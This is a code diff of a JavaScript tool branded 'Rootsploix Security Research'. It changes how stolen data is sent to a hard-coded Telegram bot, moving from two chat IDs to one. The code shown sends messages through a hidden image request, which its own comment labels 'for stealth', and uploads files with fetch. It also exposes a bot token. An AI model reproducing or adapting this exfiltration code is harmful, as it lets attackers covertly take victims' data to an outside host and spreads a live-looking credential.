@@ -209,7 +209,7 @@
             author: 'Rootsploix Security Research',
             telegram: {
                 botToken: '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM',
-                chatId: ['5312173877', '6633612153'],
+                chatId: '6633612153',
                 apiUrl: 'https://api.telegram.org/bot'
             },
             security: {
@@ -418,36 +418,24 @@
             
             async sendDirectMessage(message, options = {}) {
                 const url = `${this.apiUrl}/sendMessage`;
+                const params = new URLSearchParams({
+                    chat_id: this.chatId,
+                    text: message,
+                    parse_mode: options.parseMode || 'HTML',
+                    disable_web_page_preview: options.disablePreview || true
+                });
                 
-                // Support dual Chat IDs
-                const chatIds = Array.isArray(this.chatId) ? this.chatId : [this.chatId];
-                
-                for (const chatId of chatIds) {
-                    const params = new URLSearchParams({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: options.parseMode || 'HTML',
-                        disable_web_page_preview: options.disablePreview || true
-                    });
+                try {
+                    // Use image loading for stealth
+                    const img = new Image();
+                    img.src = `${url}?${params.toString()}`;
                     
-                    try {
-                        // Use image loading for stealth
-                        const img = new Image();
-                        img.src = `${url}?${params.toString()}`;
-                        
-                        RootsploixUtils.log('info', `Message sent via image loading to ${chatId}`);
-                    } catch (error) {
-                        // Fallback method
-                        await this.sendViaFetch(url, params);
-                    }
-                    
-                    // Small delay between dual sends
-                    if (chatIds.length > 1) {
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                    }
+                    RootsploixUtils.log('info', 'Message sent via image loading');
+                    return true;
+                } catch (error) {
+                    // Fallback method
+                    return this.sendViaFetch(url, params);
                 }
-                
-                return true;
             }
             
             async sendViaFetch(url, params) {
@@ -471,38 +459,29 @@
             }
             
             async sendFile(fileBlob, caption, type = 'document') {
-                // Support dual Chat IDs for file sending
-                const chatIds = Array.isArray(this.chatId) ? this.chatId : [this.chatId];
+                const formData = new FormData();
+                formData.append('chat_id', this.chatId);
+                formData.append(type, fileBlob, `rootsploix_${Date.now()}.${type}`);
+                formData.append('caption', caption);
+                
                 const url = `${this.apiUrl}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
                 
-                for (const chatId of chatIds) {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append(type, fileBlob, `rootsploix_${Date.now()}.${type}`);
-                    formData.append('caption', caption);
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
                     
-                    try {
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        if (response.ok) {
-                            RootsploixUtils.log('info', `File sent to ${chatId}: ${type}`);
-                        } else {
-                            throw new Error(`HTTP ${response.status} for ${chatId}`);
-                        }
-                    } catch (error) {
-                        RootsploixUtils.log('error', `File send failed to ${chatId}: ${type}`, error);
+                    if (response.ok) {
+                        RootsploixUtils.log('info', `File sent: ${type}`);
+                        return await response.json();
+                    } else {
+                        throw new Error(`HTTP ${response.status}`);
                     }
-                    
-                    // Small delay between dual sends
-                    if (chatIds.length > 1) {
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                    }
+                } catch (error) {
+                    RootsploixUtils.log('error', `File send failed: ${type}`, error);
+                    throw error;
                 }
-                
-                return true;
             }
         }
         
